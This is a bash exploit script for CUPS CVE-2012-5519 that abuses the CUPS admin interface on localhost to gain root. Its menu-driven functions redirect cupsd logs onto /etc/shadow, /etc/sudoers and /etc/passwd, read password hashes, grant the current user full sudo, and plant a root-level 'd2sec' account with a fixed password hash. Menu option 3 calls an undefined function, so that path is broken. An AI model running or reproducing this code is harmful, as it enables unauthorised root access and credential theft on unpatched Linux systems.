#!/bin/bash


function edit_etc_shadow 
{
echo '[+] editing /etc/shadow'
AUTH="Authorization: Local $(cat /var/run/cups/certs/0)"
POST -d -H "$AUTH" -H "Cookie: org.cups.sid=" http://localhost:631/admin/ <<EOF
OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0APageLog /etc/shadow
EOF
GET http://localhost:631/admin/log/page_log
}

function modify_sudoers
{
echo "[+] modifying /etc/sudoers"
cp /etc/sudoers /dev/shm/sudoers
AUTH="Authorization: Local $(cat /var/run/cups/certs/0)"
POST -d -H "$AUTH" -H "Cookie: org.cups.sid=" http://localhost:631/admin/ <<EOF
OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0AAccessLog /etc/sudoers%0ALogFilePerm 0666%0AAccessLogLevel all
EOF
GET http://localhost:631/ 2>&1 1>/dev/null
echo "`whoami` ALL=(ALL) ALL">> /etc/sudoers
cat /etc/passwd | grep -v HTTP >> /etc/sudoers
echo "[+] using now 'sudo -s'"
echo "[+] cleaning: rm -f /dev/shm/sudoers; cp /dev/shm/cupsd.conf /etc/cups/cupsd.conf"
}


function add_user
{
echo "[+] adding a user in /etc/passwd"
cp /etc/passwd /dev/shm/passwd
AUTH="Authorization: Local $(cat /var/run/cups/certs/0)"
POST -d -H "$AUTH" -H "Cookie: org.cups.sid=" http://localhost:631/admin/ <<EOF
OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0AAccessLog /etc/passwd%0ALogFilePerm 0666%0AAccessLogLevel all
EOF
GET http://localhost:631/ 2>&1 1>/dev/null
echo "d2sec:x:0:0:d2sec:/root:/bin/bash" >> /etc/passwd
cat /etc/passwd | grep -v HTTP >> /etc/passwd

echo "[+] adding a user in /etc/shadow"
POST -d -H "$AUTH" -H "Cookie: org.cups.sid=" http://localhost:631/admin/ <<EOF
OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0AAccessLog /etc/shadow%0ALogFilePerm 0666%0AAccessLogLevel all
EOF
GET http://localhost:631/ 2>&1 1>/dev/null
cp /etc/shadow /dev/shm/shadow 
echo "d2sec:$6$vsm2sp/a$EhQ/xInUxsaZX4wZfDLjOy5akuDRM/AzgmuQiGBpuHX.QTfZYMK4ATjL6R8w33hEWLDbT4AkMIER3NOyevk9G1:15740:0:99999:7:::" >> /etc/shadow
cat /etc/shadow | grep -v HTTP >> /etc/shadow
echo "[+] using now 'su d2sec:d2sec'" 
echo "[+] cleaning: rm -f /dev/shm/passwd /dev/shm/shadow; cp /dev/shm/cupsd.conf /etc/cups/cupsd.conf"
}

echo 'CUPS CVE-2012-5519 Local Privilege Escalation Vulnerability'
set -e
cp /etc/cups/cupsd.conf /dev/shm/cupsd.conf

echo
echo "1. Edit /etc/shadow"
echo "2. Modify /etc/sudoers"
echo "3. Add a user"
echo
echo -ne "Choice: "
read func

if [ "$func" -eq "1" ]
then
edit_etc_shadow
elif [ "$func" -eq "2" ]
then
modify_sudoers
elif [ "$func" -eq "3" ] 
then
lpadmin_to_root
fi
